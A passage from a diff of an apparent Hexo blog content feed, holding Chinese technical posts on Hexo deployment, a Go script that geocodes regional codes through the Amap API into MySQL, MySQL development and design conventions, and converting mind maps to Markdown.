[message]</code></pre></li></ul></li><li><p>仓库配置</p><p>配置仓库的部署方式、仓库地址和分支名称，这里选择github和coding作为托管。</p><pre><code>deploy:- type: git  repository:     github: git@github.com:xxx.git,main    coding: git@e.coding.net:xxx,master</code></pre></li><li><p>网站部署</p><p>在博客主目录下，终端输入：</p><pre><code>hexo d -g-g, --generate部署之前预先生成静态文件</code></pre><p>执行 <code>hexo deploy</code> 时，Hexo 会将 public 目录中的文件和目录推送至 _config.yml 中指定的远端仓库和分支中，并且完全覆盖该分支下的已有内容</p></li></ul><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><ol><li><p>material主题，主页的分页不显示icon，显示源代码</p><p>修复：在material主题文件夹的layout目录下，在index.ejs中的分页代码新增<code>escape:false</code></p><pre><code> &lt;%- paginator(&#123;   prev_text: __(&#39;&lt;button aria-label=&quot;Last page&quot; class=&quot;mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon&quot;&gt;&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;arrow_back&lt;/i&gt;&lt;/button&gt;&#39;),   next_text: __(&#39;&lt;button aria-label=&quot;Next page&quot; class=&quot;mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon&quot;&gt;&lt;i class=&quot;material-icons&quot; role=&quot;presentation&quot;&gt;arrow_forward&lt;/i&gt;&lt;/button&gt;&#39;),   space: &#39;&#39;,   escape: false, &#125;) %&gt;</code></pre></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>使用高德地图API根据地址名称获取经纬度（Go语言）</title>
+      <link href="/technique/16.html"/>
+      <url>/technique/16.html</url>
+      
+        <content type="html"><![CDATA[<p>天地图、腾讯地图、高德地图等都提供对外开放的API，这里主要针对高德地图，进行地理编码接口的调用。<br>高德地图web API官方文档<a href="https://lbs.amap.com/api/webservice/summary">链接</a>，根据文档的步骤，构造对应的请求URL<br><code>https://restapi.amap.com/v3/geocode/geo?parameters</code></p><blockquote><p>背景</p></blockquote><p>地理编码表：共五级行政区域，分别为省&#x2F;直辖市、区&#x2F;县、街道&#x2F;镇、社区&#x2F;乡村</p><p>地理编码表中各地理编码和高德地图提供的地理编码不完全相同</p><blockquote><p>方法</p></blockquote><p>按级别分批获取地理编码表中的地址名称，根据pcode构造结构化地址信息，作为参数address的值，默认返回格式为json，判断返回的地理信息匹配级别是否对应，将匹配正确的经纬度信息插入数据库。</p><p>匹配级别和五级行政区域名称相差，但是返回数据合理的，可以将该匹配级别加入ignore list</p><p>Go语言代码如下：</p><pre><code>package mainimport (    &quot;encoding/json&quot;    &quot;flag&quot;    &quot;fmt&quot;    &quot;io/ioutil&quot;    &quot;net/http&quot;    &quot;strconv&quot;    &quot;strings&quot;    &quot;gorm.io/driver/mysql&quot;    &quot;gorm.io/gorm&quot;)// Area 地理编码表结构type Area struct &#123;    ID            int     `json:&quot;id&quot; gorm:&quot;column:id; PRIMARY_KEY; AUTO_INCREMENT&quot;`    Code          int64   `json:&quot;code&quot; gorm:&quot;column:code;type:bigint(12)&quot;`    Name          string  `json:&quot;name&quot; gorm:&quot;column:name; type:varchar(50); default:&#39;&#39;&quot;`    Pcode         int64   `json:&quot;pcode&quot; gorm:&quot;column:pcode;type:bigint(12)&quot;`    ProvinceCode  int64   `json:&quot;province_code&quot; gorm:&quot;column:province_code;type:bigint(12)&quot;`    CityCode      int64   `json:&quot;city_code&quot; gorm:&quot;column:city_code;type:bigint(12)&quot;`    AreaCode      int64   `json:&quot;area_code&quot; gorm:&quot;column:area_code;type:bigint(12)&quot;`    StreetCode    int64   `json:&quot;street_code&quot; gorm:&quot;column:street_code;type:bigint(12)&quot;`    CommitteeCode int64   `json:&quot;committee_code&quot; gorm:&quot;column:committee_code;type:bigint(12)&quot;`    CommitteeType int64   `json:&quot;committee_type&quot; gorm:&quot;column:committee_type;type:bigint(12)&quot;`    Sort          int     `json:&quot;sort&quot; gorm:&quot;column:sort; type:int(2); default:1&quot;`    Level         int     `json:&quot;level&quot; gorm:&quot;column:level; type:int(2); default:1&quot;`    Longitude     float64 `json:&quot;longitude&quot; gorm:&quot;column:longitude; type:decimal(10); default:NULL&quot;`    Latitude      float64 `json:&quot;latitude&quot; gorm:&quot;column:latitude; type:decimal(10); default:NULL&quot;`&#125;// TableName  return table namefunc (Area) TableName() string &#123;    return &quot;tbl_area&quot;&#125;// GetAreaMapByIDS 根据地区id获取 map[id]area结构func GetAreaMapByIDS(db *gorm.DB, IDS []int) (map[int]Area, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;id in (?)&quot;, IDS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int]Area)    for _, val := range res &#123;        areaMap[val.ID] = Area&#123;            ID:        val.ID,            Name:      val.Name,            Code:      val.Code,            Pcode:     val.Pcode,            Level:     val.Level,            Longitude: val.Longitude,            Latitude:  val.Latitude,        &#125;    &#125;    return areaMap, nil&#125;// GetAreaNameMapByCodeS 根据地区code获取 mapd[code]name 结构func GetAreaNameMapByCodeS(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.Code] = val.Name    &#125;    return areaMap, nil&#125;// GetProvinceNameMapByCodeS 根据省code获取 map[id]name 结构func GetProvinceNameMapByCodeS(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.ProvinceCode] = val.Name    &#125;    return areaMap, nil&#125;// GetCityNameMapByCodeS 根据市code获取 map[id]name 结构func GetCityNameMapByCodeS(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.CityCode] = val.Name    &#125;    return areaMap, nil&#125;// GetAreaNameMapByCodeS2 根据区县code获取 map[id]name 结构func GetAreaNameMapByCodeS2(db *gorm.DB, codeS []int64) (map[int64]string, error) &#123;    var res []Area    r := db.Model(&amp;Area&#123;&#125;).Where(&quot;code in (?)&quot;, codeS).Find(&amp;res)    if r.Error != nil &#123;        return nil, r.Error    &#125;    areaMap := make(map[int64]string)    for _, val := range res &#123;        areaMap[val.AreaCode] = val.Name    &#125;    return areaMap, nil&#125;// RequetForFile request for filefunc RequetForFile(url string) (string, error) &#123;    var bodyStr string    // Get the data    resp, err := http.Get(url)    if err != nil &#123;        return bodyStr, err    &#125;    defer resp.Body.Close()    body, err := ioutil.ReadAll(resp.Body)    if err != nil &#123;        return bodyStr, err    &#125;    bodyStr = string(body)    return bodyStr, nil&#125;func main() &#123;    var province string    var areaLevel string    var areaName string    var areaNick string    flag.StringVar(&amp;province, &quot;p&quot;, &quot;&quot;, &quot;省&quot;) //五级需要    flag.StringVar(&amp;areaLevel, &quot;l&quot;, &quot;&quot;, &quot;地区级别&quot;)    flag.StringVar(&amp;areaName, &quot;n&quot;, &quot;&quot;, &quot;地区级别名称&quot;)    flag.StringVar(&amp;areaNick, &quot;k&quot;, &quot;&quot;, &quot;地区级别名称别名&quot;)    // 解析    flag.Parse()    dsn := fmt.Sprintf(        &quot;%s:%s@tcp(%s)/%s?parseTime=True&amp;loc=Local&quot;,        LocalUser,        LocalPassword,        LocalHost,        LocalDatabase,    )    db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)    if err != nil &#123;        fmt.Println(err)    &#125;    var res []Area    //省、直辖市    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s and longitude is null &quot;, Table, areaLevel)    //市    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s and name not in(&#39;市辖区&#39;,&#39;省直辖县级行政区划&#39;,&#39;县&#39;) &quot;, Table, areaLevel)    //区、县    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s  and name not in(&#39;市辖区&#39;) and longitude is null&quot;, Table, areaLevel)    //街道、镇    //sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s  and  longitude is null&quot;, Table, areaLevel)    //社区、乡村    sqlStr := fmt.Sprintf(&quot;select * from %s where level=%s  and  longitude is null and province_code = %s&quot;, Table, areaLevel, province)    fmt.Println(&quot;--this is sqlstr--&quot;)    fmt.Println(sqlStr)    db.Raw(sqlStr).Scan(&amp;res)    pCodeList := make([]int64, 0, len(res))    // provinceList := make([]int64, 0, len(res))    cityList := make([]int64, 0, len(res))    areaList := make([]int64, 0, len(res))    for _, v := range res &#123;        cityTemp := ZeroFillByStr(strconv.FormatInt(v.CityCode, 10), 12, false)        cityTempInt, _ := strconv.ParseInt(cityTemp, 10, 64)        cityList = append(cityList, cityTempInt)        areaTemp := ZeroFillByStr(strconv.FormatInt(v.AreaCode, 10), 12, false)        areaTempInt, _ := strconv.ParseInt(areaTemp, 10, 64)        areaList = append(areaList, areaTempInt)        pCodeList = append(pCodeList, v.Pcode)    &#125;    pAreaMap, err := GetAreaNameMapByCodeS(db, pCodeList)    if err != nil &#123;        fmt.Println(err)        return    &#125;    fmt.Println(&quot;--this is p map--&quot;)    fmt.Println(pAreaMap)    provinceCode := ZeroFillByStr(province, 12, false)    tempInt, _ := strconv.ParseInt(provinceCode, 10, 64)    proAreaMap, err := GetProvinceNameMapByCodeS(db, []int64&#123;tempInt&#125;)    if err != nil &#123;        fmt.Println(err)        return    &#125;    cityAreaMap, err := GetCityNameMapByCodeS(db, cityList)    if err != nil &#123;        fmt.Println(err)        return    &#125;    areaMap, err := GetAreaNameMapByCodeS2(db, areaList)    if err != nil &#123;        fmt.Println(err)        return    &#125;    for _, val := range res &#123;        fmt.Println(val)        urlString := fmt.Sprintf(AmapApi, proAreaMap[val.ProvinceCode]+cityAreaMap[val.CityCode]+areaMap[val.AreaCode]+pAreaMap[val.Pcode]+val.Name, Key)        fmt.Println(&quot;---this is request url--&quot;)        fmt.Println(urlString)        bodyResp, err := RequetForFile(urlString)        if err != nil &#123;            fmt.Println(err)        &#125;        var dataInfo map[string]interface&#123;&#125;        var location string        if err := json.Unmarshal([]byte(bodyResp), &amp;dataInfo); err != nil &#123;            fmt.Println(err)        &#125;        fmt.Println(&quot;--this is resp---&quot;)        fmt.Println(dataInfo)        for idx, value := range dataInfo &#123;            if idx == &quot;status&quot; &#123;                if value.(string) != &quot;1&quot; &#123;                    return                &#125;            &#125;            if idx == &quot;geocodes&quot; &#123;                mapTemp := value.([]interface&#123;&#125;)                temp := mapTemp[0].(map[string]interface&#123;&#125;)                //  &amp;&amp; temp[&quot;level&quot;].(string) != LevelFour  &amp;&amp; temp[&quot;level&quot;].(string) != DevLevel                if temp[&quot;level&quot;].(string) != areaName &amp;&amp; temp[&quot;level&quot;].(string) != areaNick&#123;                    return                &#125;                location = temp[&quot;location&quot;].(string)            &#125;        &#125;        locationList := strings.Split(location, &quot;,&quot;)        fmt.Println(&quot;----this is location --&quot;)        updateSql := fmt.Sprintf(&quot;UPDATE %s SET longitude = %s, latitude = %s where id = %d &quot;, Table, locationList[0], locationList[1], val.ID)        fmt.Println(&quot;---this is sql str---&quot;)        fmt.Println(updateSql)        db.Exec(updateSql)        if db.Error != nil &#123;            fmt.Println(db.Error)        &#125;    &#125;&#125;const (    AmapApi       = &quot;https://restapi.amap.com/v3/geocode/geo?address=%s&amp;key=%s&quot;    LocalHost     = &quot;127.0.0.1&quot;    LocalDatabase = &quot;xxx&quot;    LocalPort     = &quot;3306&quot;    LocalUser     = &quot;xxx&quot;    LocalPassword = &quot;xxx&quot;    Key           = &quot;xxx&quot;)// ZeroFillByStr 字符串前置/后置补零func ZeroFillByStr(str string, resultLen int, reverse bool) string &#123;    if len(str) &gt; resultLen || resultLen &lt;= 0 &#123;        return str    &#125;    if reverse &#123;        return fmt.Sprintf(&quot;%0*s&quot;, resultLen, str) //不足前置补零    &#125;    result := str    for i := 0; i &lt; resultLen-len(str); i++ &#123;        result += &quot;0&quot;    &#125;    return result&#125;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> coding </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-数据库篇（开发规范）</title>
+      <link href="/technique/15.html"/>
+      <url>/technique/15.html</url>
+      
+        <content type="html"><![CDATA[<p>数据库开发规范</p><h3 id="数据库开发规范"><a href="#数据库开发规范" class="headerlink" title="数据库开发规范"></a>数据库开发规范</h3><ul><li><strong>SQL语句</strong><ul><li><p>避免使用双%号和like，搜索严禁左模糊或者全模糊</p></li><li><p>禁止使用不含字段列表的insert语句</p><p>如：insert into values (‘a’,’b’,’c’)；应使用insert into t(c1,c2,c3) values (‘a’,’b’,’c’)</p></li><li><p>禁止使用order by rand（）进行随机排序</p></li><li><p>尽量避免in操作，若实在避免不了，需要仔细评估in后边的集合元素数量，控制在1000个之内</p></li><li><p>禁止where从句中对列进行函数转换和计算</p><p>如：where date（createtime）&#x3D;‘20160901’ 会无法使用createtime列上索引。改成 where createtime&gt;&#x3D;’20160901’ and createtime &lt;’20160902’）</p></li><li><p>尽量避免使用子查询，可以把子查询优化为join操作</p><p>通常子查询在in子句中，且子查询中为简单SQL(不包含union、group by、order by、limit从句)时，才可以把子查询转化为关联查询进行优化。</p><p>子查询性能差的原因：</p><ol><li>子查询的结果集无法使用索引，通常子查询的结果集会被存储到临时表中，不论是内存临时表还是磁盘临时表都不会存在索引，所以查询性能会受到一定的影响；</li><li>特别是对于返回结果集比较大的子查询，其对查询性能的影响也就越大；</li><li>由于子查询会产生大量的临时表也没有索引，所以会消耗过多的CPU和IO资源，产生大量的慢查询。</li></ol></li><li><p>避免使用select * 查询</p><p>消耗更多的cpu和io及网络带宽资源，无法使用覆盖索引，可减少表结构变更带来的影响</p></li><li><p>避免数据类型的隐式转换</p><p>隐式转换会导致索引失效。如：select name,phone from customer where id &#x3D; ‘111’</p></li><li><p>对应同一列进行or判断时，使用in代替or</p><p>in的值不要超过500个in操作可以更有效的利用索引，or大多数情况下很少能利用到索引</p></li><li><p>在明显不会有重复值时使用UNION ALL而不是UNION</p><p>UNION会把两个结果集的所有数据放到临时表中后再进行去重操作；UNION ALL不会再对结果集进行去重操作</p></li><li><p>拆分复杂的大SQL为多个小SQL</p><p>大SQL逻辑上比较复杂，需要占用大量CPU进行计算的SQL；MySQL中，一个SQL只能使用一个CPU进行计算；SQL拆分后可以通过并行执行来提高处理效率</p></li><li><p>避免使用JOIN关联太多的表<br>对于Mysql来说，是存在关联缓存的，缓存的大小可以由join_buffer_size参数进行设置。</p><p>在Mysql中，对于同一个SQL多关联（join）一个表，就会多分配一个关联缓存，如果在一个SQL中关联的表越多，所占用的内存也就越大。</p><p>如果程序中大量的使用了多表关联的操作，同时join_buffer_size设置的也不合理的情况下，就容易造成服务器内存溢出的情况，就会影响到服务器数据库性能的稳定性。</p><p>同时对于关联操作来说，会产生临时表操作，影响查询效率Mysql最多允许关联61个表，建议不超过3个。</p></li></ul></li></ul><h3 id="数据库操作规范"><a href="#数据库操作规范" class="headerlink" title="数据库操作规范"></a>数据库操作规范</h3><ul><li><strong>数据库操作</strong><ul><li><p>减少同数据库的交互次数</p><p>数据库更适合处理批量操作，合并多个相同的操作到一起，可以提高处理效率</p></li><li><p>超100万行的批量写（UPDATE、DELETE、INSERT）操作，要分批多次进行操作</p><p>主从环境中，大批量操作可能会造成严重的主从延迟，大批量的写操作一般都需要执行一定长的时间，而只有当主库上执行完成后，才会在其他从库上执行，所以会造成主库与从库长时间的延迟情况。</p><p>binlog日志为row格式时会产生大量的日志。大批量写操作会产生大量日志，特别是对于row格式二进制数据而言，由于在row格式中会记录每一行数据的修改，我们一次修改的数据越多，产生的日志量也就会越多，日志的传输和恢复所需要的时间也就越长，这也是造成主从延迟的一个原因。</p></li><li><p>对于大表使用pt-online-schema-change修改表结构</p><p>避免大表修改产生的主从延迟；避免在对表字段进行修改时进行锁表</p><p>对大表数据结构的修改一定要谨慎，会造成严重的锁表操作，尤其是生产环境，是不能容忍的。</p><p>pt-online-schema-change它会首先建立一个与原表结构相同的新表，并且在新表上进行表结构的修改，然后再把原表中的数据复制到新表中，并在原表中增加一些触发器。</p><p>把原表中新增的数据也复制到新表中，在行所有数据复制完成之后，把新表命名成原表，并把原来的表删除掉。</p></li><li><p>禁止为程序使用的账号赋予super权限</p><p>当达到最大连接数限制时，还运行1个有super权限的用户连接super权限只能留给DBA处理问题的账号使用。</p></li><li><p>对于程序连接数据库账号，遵循权限最小原则</p><p>程序使用数据库账号只能在一个DB下使用，不准跨库，程序使用的账号原则上不准有drop权限。</p></li><li><p>程序连接不同的数据库使用不同的账号，禁止跨库查询</p><p>为数据库迁移和分库分表留出余地</p><p>降低业务耦合度</p><p>避免权限过大而产生的安全风险</p></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> coding </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-数据库篇（设计规范）</title>
+      <link href="/technique/14.html"/>
+      <url>/technique/14.html</url>
+      
+        <content type="html"><![CDATA[<p>在项目开发中，数据库的设计规范性是项目协调、团队合作的前提。例如，数据库中表、字段统一命名规范，在设计合理的同时增加数据库的可维护性。</p><h3 id="数据库命名规范"><a href="#数据库命名规范" class="headerlink" title="数据库命名规范"></a>数据库命名规范</h3><p>数据库、表及字段的命名，需要“见名知意”。与此同时，命名及字段的类型和注释也会影响由工具生成的数据库文档、接口文档等，因此，在数据库设计过程中，需要遵守约定的命名规范。(<a href="https://juejin.cn/post/6844903476946796551">数据库中的设计规范</a>)</p><ul><li><p><strong>可用字符</strong></p><p>数据库、表、字段等所有名称的可用字符范围为：A-Z，a-z，0-9和_下划线。数据库及表名均不允许使用数字，而字段名除特殊情况外不允许使用数字。</p><p>为了方便阅读和操作，数据库、表和字段名一般不使用关键字保留字。</p></li><li><p><strong>命名方式</strong></p><p>数据库、表、字段等所有名称需要清晰明了，使用含义对应的英文单词、英文短语或相应的缩写，禁止使用汉语拼音，且均使用单数名。</p><p>Oracle表、字段等名称统一使用大写，单词间用_下划线分隔；SQLServer数据库、表等名称采用Pascal命名法，字段名称采用Camel命名法，大小写字母混排；MySQL数据库、表、字段等名称统一使用小写，单词间用_下划线分隔。</p><p>临时库、表以temp为前缀，日期为后缀。备份表以bak为前缀，日期为后缀。</p><ul><li>PS 命名方法</li></ul><blockquote><p>匈牙利命名法。由微软的一位匈牙利程序员Charles Simonyi提出，相对复杂，首字母小写，基本原则是：变量名＝属性＋类型＋对象描述，其中每一对象的名称都要求有明确含义，可以取对象名字全称或名字的一部分。匈牙利命名法主要在C或C++这种面向过程的程序语言中使用。</p></blockquote><blockquote><p>Camel命名法。即骆驼式命名法，首字母小写，采用该命名法的名称看起来就像骆驼的驼峰一样高低起伏。Camel命名法有两种形式：<br>第一种是混合使用大小写字母，例如englishName、fartherCode。在Java中，属性名和方法名一般都采用这种命名方式，在C#中只有属性名采用这种命名方式，SQLServer中字段的命名也采用这种方式。<br>第二种是单词之间加下划线，例如english_name、farther_code。Oracel和MySQL表、字段的命名都采用这种方式，不过Oracle全部使用大写字母，MySQL全部使用小写字母。在Java、C#，甚至是在JavaScript中，所有的常量，都使用这种命名方式，不过和Oracle表字段的命名方式一样要全部使用大写字母。</p></blockquote><blockquote><p>Pascal命名法。即帕斯卡命名法，与Camel命名法类似，不过是首字母大写。在C#中，类名和方法名一般采用这种命名方式，在Java中类名一般采用这种方式。SQLServer中数据库、表的命名也采用这种方式。</p></blockquote></li><li><p><strong>长度限制</strong></p><table><thead><tr><th>数据库</th><th>表名</th><th>字段名</th></tr></thead><tbody><tr><td>MySQL</td><td>64</td><td>64</td></tr><tr><td>SQLServer</td><td>128</td><td>128</td></tr><tr><td>Oracle</td><td>30</td><td>30</td></tr><tr><td>Acess</td><td>30</td><td>30</td></tr><tr><td>DB2</td><td>128</td><td>128</td></tr><tr><td>Informix</td><td>18</td><td>18</td></tr></tbody></table><p>若表名和字段名的长度在长度限制内，但是仍然过长，生成的相关类名变量名都不利于后期的编写，因此需要将表名和字段的最终长度控制在大约30个字符以内。同时，在名称超过一定字符就使用缩写。</p><p>缩写的规则一般为：<br>  字典中单词的缩写，eg：December -&gt; Dec ；<br>  删除单词中的重复字母和单词元音，eg：Error -&gt; Err</p></li></ul><h3 id="数据库设计规范"><a href="#数据库设计规范" class="headerlink" title="数据库设计规范"></a>数据库设计规范</h3><ul><li><p><strong>字符集（Character Set）和字符序（Collation）规范</strong></p><p>字符集：给定一系列字符并赋予对应的编码后，所有这些字符和编码对组成的集合。</p><p>字符序：指定数据集如何排序、及字符串间的比对规则。</p><p>即，字符集定义了可以使用的字符，对应的字符序定义了字符之间的关系（<a href="https://www.cnblogs.com/seasonhu/p/14994857.html">参考</a>）。并且字符序依赖字符集，eg：把gb18030_chinese_ci作为字符序，就要求字符集是gb18030，而不能是utf8mb4。</p><p>可以对表进行字符集的设置，也可以单独对某个字段进行字符集的设置，优先级从高到底可分为四种：服务器层、数据库层、表层、字段层，真正决定性因素是在字段层，如果没有指定则默认从上一层继承。</p><p>数据库、表、字段的字符序也可逐级覆盖，类似四种字符集设置方式间的优先级关系。</p><p>建议数据库和表的字符集统一为utf8（MySQL为utf8mb4，MySQL中的utf8，更准确的名字是utf8mb3，一个字符最多使用3个字节来存储），字符序则根据实际需求选择，不同字段可以使用不同字符序（eg：大小写敏感度不同）。</p><p>utf8是国际通用编码，几乎所有网络应用都使用了Unicode字符集。</p><p>数据库和表的字符集统一，兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效。</p><p>针对MySQL字符集为utf8mb4时，具体讨论utf8mb4_0900_ai_ci和utf8mb4_general_ci。</p><p>utf8mb4_0900_ai_ci：中间的0900，它对应的是Unicode 9.0的规范，ai表示accent insensitivity，也就是“不区分音调”，而ci表示case insensitivity，也就是“不区分大小写”。</p><p>MySQL 8.0之后，utf8mb4对应的默认字符序不再像之前版本一样是是utf8mb4_general_ci，而是统一更新成了utf8mb4_0900_ai_ci。</p></li><li><p><strong>表设计规范</strong></p><ul><li><p>使用Innodb存储引擎，支持事务，行锁，高并发下性能更好</p></li><li><p>表和字段都要有comment注释字段</p></li><li><p>关于主键，命名为 id，类型为 int 或 bigint，且为 auto_increment</p></li><li><p>尽量控制单表数据量的大小</p><p>建议控制在500W以内，过大会造成修改表结构，备份，恢复都会有很大的问题。可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小</p></li><li><p>谨慎使用分区表。分区表在物理上表现为多个文件，在逻辑上表现为一个表。谨慎选择分区键，跨分区查询效率可能更低 建议采用物理分表的方式管理大数据</p></li><li><p>尽量做到冷热数据分离，减小表的宽度</p></li><li><p>禁止在表中建立预留字段。预留字段的命名不容易见名知意，存储类型无法确认，对预留字段的修改会对表进行锁定</p></li><li><p>禁止在数据库中存储图片，文件等大的二进制数据</p></li><li><p>禁止在线上做数据库压力测试</p></li><li><p>不得使用外键与级联，一切外键概念必须在应用层解决</p><p>外键与级联更新适用于单机低并发，不适合分布式、高并发集群；级联更新是强阻塞，存在数据库更新风暴的风险；外键影响数据库的插入速度。</p></li></ul></li><li><p><strong>字段设计规范</strong></p><ul><li><p>优先选择符合存储需要的最小的数据类型</p><p> 列的字段越大，建立索引时所需要的空间也就越大，这样一页中所能存储的索引节点的数量也就越少也越少，在遍历时所需要的IO次数也就越多， 索引的性能也就越差。</p><p> eg： 对于非负型的数据（如自增ID、整型IP）来说，要优先使用无符号整型来存储</p></li><li><p>尽可能把所有列定义为NOT NULL</p><p> 索引NULL列需要额外的空间来保存，所以要占用更多的空间；<br> 进行比较和计算时要对NULL值做特别的处理</p></li><li><p>尽量不要定义 DEFAULT 值</p><p> 因为业务逻辑下放到了数据库层面，这是一种隐式行为，不利于开发和维护</p></li><li><p>反范式设计</p><p> 当数据不怎么变化时，把经常需要 join 查询的字段，在其它表里冗余一份。如 username 属性在 user_account，user_login_log 等表里冗余一份，减少 join 查询。</p></li><li><p>使用TIMESTAMP（4个字节）或DATETIME类型（8个字节）存储时间</p><p> TIMESTAMP 存储的时间范围 1970-01-01 00:00:01 ~ 2038-01-19-03:14:07。</p><p> TIMESTAMP 占用4字节和INT相同，但比INT可读性高.</p><p> 超出TIMESTAMP取值范围的使用DATETIME类型存储。</p><p> 经常会有人用字符串存储日期型的数据（不正确的做法）：</p><p>  缺点1：无法用日期函数进行计算和比较</p><p>  缺点2：用字符串存储日期要占用更多的空间</p></li><li><p>同财务相关的金额类数据必须使用decimal类型</p><p> 非精准浮点：float,double  ；<br> 精准浮点：decimal</p><p> Decimal类型为精准浮点数，在计算时不会丢失精度。占用空间由定义的宽度决定，每4个字节可以存储9位数字，并且小数点要占用一个字节。可用于存储比bigint更大的整型数据。</p></li><li><p>避免使用ENUM类型</p><p> 修改ENUM值需要使用ALTER语句</p><p> ENUM类型的ORDER BY操作效率低，需要额外操作</p><p> 禁止使用数值作为ENUM的枚举值</p></li><li><p>避免使用TEXT、BLOB数据类型，最常见的TEXT类型可以存储64k的数据</p><p> 建议把BLOB或是TEXT列分离到单独的扩展表中</p><p> Mysql内存临时表不支持TEXT、BLOB这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。</p><p> 而且对于这种数据，Mysql还是要进行二次查询，会使sql性能变得很差，但是不是说一定不能使用这样的数据类型。</p><p> 如果一定要使用，建议把BLOB或是TEXT列分离到单独的扩展表中，查询时一定不要使用select * 而只需要取出必要的列，不需要TEXT列的数据时不要对该列进行查询。</p><p> TEXT或BLOB类型只能使用前缀索引</p><p> 因为MySQL对索引字段长度是有限制的，所以TEXT类型只能使用前缀索引，并且TEXT列上是不能有默认值的。</p></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> coding </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>思维导图在hexo页面展示</title>
+      <link href="/technique/13.html"/>
+      <url>/technique/13.html</url>
+      
+        <content type="html"><![CDATA[<p>这些天整理自己之前的产出，大多是思维导图，于是想让其优雅地在博客页面展示。</p><p>起先想到直接导出图片格式，在页面展示。但是节点和文字一多，清晰度和可操作性就大大降低。</p><p>接着考虑SVG格式，可以使用<a href="https://markmap.js.org/repl/">Try markmap</a>——markmap的在线工具，当然这个得先转换成Markdown格式</p><p>那就直接使用<a href="https://github.com/gera2ld/markmap">hexo-markmap插件</a>;O) </p><h3 id="processon思维导图导出"><a href="#processon思维导图导出" class="headerlink" title="processon思维导图导出"></a>processon思维导图导出</h3><p>processon支持将思维导图导出成POS文件（.pos）、Xmind文件（.xmind）以及FreeMind文件（.mm）</p><h3 id="思维导图转成Markdown"><a href="#思维导图转成Markdown" class="headerlink" title="思维导图转成Markdown"></a>思维导图转成Markdown</h3><p>可以利用现成的思维导图软件将思维导图导出成markdown<br>当然，像我一样没有安装这些软件的可以直接使用百度脑图。<br>不过，百度脑图导入的文件格式存在限制：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/tech/naotu-upload.png" alt="百度脑图文件上传"><br>processon导出的思维导图，FreeMind文件（.mm）可以在百度脑图导入成功。<br>导入后，可以再导出为markdown格式的文件</p><p>ps：明明支持.xmind，但是笔者导入后思维导图显示乱码</p><blockquote><p>Github也有一些将思维导图转成markdown的程序，如下：</p></blockquote><p>POS文件和Xmind文件转成Markdown文件（Java）：<a href="https://github.com/NotInWine/xmind-to-md">Xmind-to-md</a></p><p>KityMinder文件转成Markdown文件（Python）：<a href="https://github.com/Ash-one/km2md">km2md</a></p><pre><code>import jsonclass Node:    def __init__(self,data,children:list):        self.data = data        self.text = &#39; &#39;+data[&#39;text&#39;]        self.children = []        for child in self.getchildren(children):            node = Node(child[&#39;data&#39;],child[&#39;children&#39;])            self.children.append(node)            def getchildren(self,children:list):        realchildren = []        for child in children:            if child != None:                realchildren.append(child)        return realchildrendef node2md(md,node:Node,layer:int):    if node.children is None:        return md    else:        for child in node.children:            md += &#39;#&#39;*layer+ child.text + &#39;\n&#39; + node2md(&#39;&#39;,child,layer+1)        layer += 1        return mdif __name__ == &#39;__main__&#39;:    path = &#39;xxx.km&#39;    md_path = &#39;xxx.md&#39;        with open(path, &#39;r&#39;) as f:        content = json.load(f)        root = Node(content[&#39;root&#39;][&#39;data&#39;],content[&#39;root&#39;][&#39;children&#39;])    md = &#39;#&#39; + root.text + &#39;\n&#39;    layer = 2    md = node2md(md,root,layer)    with open(md_path,&#39;w&#39;) as f2:        f2.write(md)    print(md)    print(&#39;ok,please check your md file&#39;)</code></pre><p>Xmind文件转成Markdown文件（Python）：<a href="https://github.com/LiWenGu/xmind-zen2markdown">XmindGenMarkdown</a></p><pre><code>import jsonfrom zipfile import ZipFileclass XmindFileParser:    content_json = &quot;content.json&quot;    xmindFileContent = [content_json]    markdown_file_content = &quot;&quot;    